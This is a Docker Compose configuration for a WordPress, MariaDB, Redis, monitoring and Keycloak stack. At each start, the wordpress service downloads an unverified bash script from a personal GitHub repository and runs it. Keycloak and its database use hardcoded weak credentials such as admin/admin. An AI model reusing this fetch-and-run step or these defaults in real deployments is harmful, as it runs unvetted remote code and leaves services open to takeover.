services:

# Приложение

  nginx:
    image: nginx:stable-alpine3.20-perl
    container_name: nginx
    volumes:
      - ./wordpress:/var/www/html
      - ./nginx:/etc/nginx/conf.d
    networks:
      - monitoring
      - nginx_wordpress
    ports:
      - "80:80"
    depends_on:
      -  wordpress
    logging:
      driver: "json-file"
      options:
        tag: "{{.ImageName}}|{{.Name}}"

  nginx_exporter:
    image: nginx/nginx-prometheus-exporter:1.3
    container_name: nginx_exporter
    restart: always
    command:
      - -nginx.scrape-uri=http://nginx/stub_status
    expose: 
      - 9113
    networks:
      - monitoring
    depends_on:
      - nginx

  wordpress:
    image: wordpress:6.7.0-php8.1-fpm
    container_name: wordpress
    networks:
      - nginx_wordpress
      - wordpress_db
    environment:
      WORDPRESS_DB_HOST: ${WORDPRESS_DB_HOST}
      WORDPRESS_DB_USER: ${WORDPRESS_DB_USER}
      WORDPRESS_DB_PASSWORD: ${WORDPRESS_DB_PASSWORD}
      WORDPRESS_DB_NAME: ${WORDPRESS_DB_NAME}
      WORDPRESS_TABLE_PREFIX: ${WORDPRESS_TABLE_PREFIX}
      WORDPRESS_CONFIG_EXTRA: |
        define('WP_REDIS_HOST', '${REDIS_HOST}');
        define('WP_REDIS_PORT', ${REDIS_PORT});
    volumes:
      - ./wordpress:/var/www/html
    restart: always
    command: >
      sh -c '
        curl -O https://raw.githubusercontent.com/f803/test/refs/heads/main/script.sh &&
        /bin/bash script.sh
      '
    depends_on:
      db:
         condition: service_healthy

  redis:
    image: redis:alpine3.20
    container_name: redis
    volumes:
      - ./redis/redis.conf:/data/redis.conf
    networks:
      - wordpress_db

  db:
    image: mariadb:11.5.2
    container_name: db
    networks:
      - wordpress_db
    environment:
      MARIADB_RANDOM_ROOT_PASSWORD: ${MARIA_DB_RNDM_PASS}
      MARIADB_DATABASE: ${WORDPRESS_DB_NAME}
      MARIADB_USER: ${WORDPRESS_DB_USER}
      MARIADB_PASSWORD: ${WORDPRESS_DB_PASSWORD}
    volumes:
      - db_data:/var/lib/mysql
    healthcheck:
      test: ["CMD", "healthcheck.sh", "--connect", "--innodb_initialized"]
      interval: 10s
      start_period: 5s
      retries: 3
      timeout: 5s

# Экспортеры

  node-exporter:
    image: prom/node-exporter:latest
    container_name: node-exporter
    restart: unless-stopped
    volumes:
      - /proc:/host/proc:ro
      - /sys:/host/sys:ro
      - /:/rootfs:ro
    command:
      - '--path.procfs=/host/proc'
      - '--path.rootfs=/rootfs'
      - '--path.sysfs=/host/sys'
      - '--collector.filesystem.mount-points-exclude=^/(sys|proc|dev|host|etc)($$|/)'
    ports:
      - 9100:9100
    networks:
      - monitoring

  cadvisor:
    image: gcr.io/cadvisor/cadvisor:latest
    container_name: cadvisor
    ports:
      - 8080:8080
    volumes:
      - /:/rootfs:ro
      - /var/run:/var/run:rw
      - /sys:/sys:ro
      - /var/lib/docker/:/var/lib/docker:ro
    networks:
      - monitoring


# Keycloak

  keycloak:
    image: quay.io/keycloak/keycloak:23.0.7
    container_name: keycloak
    environment:
      KC_DB: postgres
      KC_DB_URL: jdbc:postgresql://keycloakdb:5432/keycloak
      KC_DB_USERNAME: keycloak
      KC_DB_PASSWORD: password

      KC_HOSTNAME: 192.168.4.62
#      KC_HOSTNAME: localhost
      KC_HOSTNAME_PORT: 8443
      KC_HOSTNAME_STRICT: false
      KC_HOSTNAME_STRICT_HTTPS: false

      KC_HTTP_PORT: 8443
      KC_LOG_LEVEL: info
      KC_METRICS_ENABLED: true
      KC_HEALTH_ENABLED: true
      KEYCLOAK_ADMIN: admin
      KEYCLOAK_ADMIN_PASSWORD: admin
    command: start-dev --hostname-debug=true
    depends_on:
      - keycloakdb
    ports:
      - 8443:8443
    networks:
      - keycloak_network
      - nginx_wordpress

  keycloakdb:
    image: postgres:15
    volumes:
      - postgres_data:/var/lib/postgresql/data
    environment:
      POSTGRES_DB: keycloak
      POSTGRES_USER: keycloak
      POSTGRES_PASSWORD: password
    container_name: keycloak_db
    networks:
      - keycloak_network

#      start-dev --http-relative-path=/auth --http-port 8443

networks:
  nginx_wordpress:
  keycloak_network:
  wordpress_db:
  monitoring:
    name: monitoring-net

volumes:
  db_data:
  postgres_data:
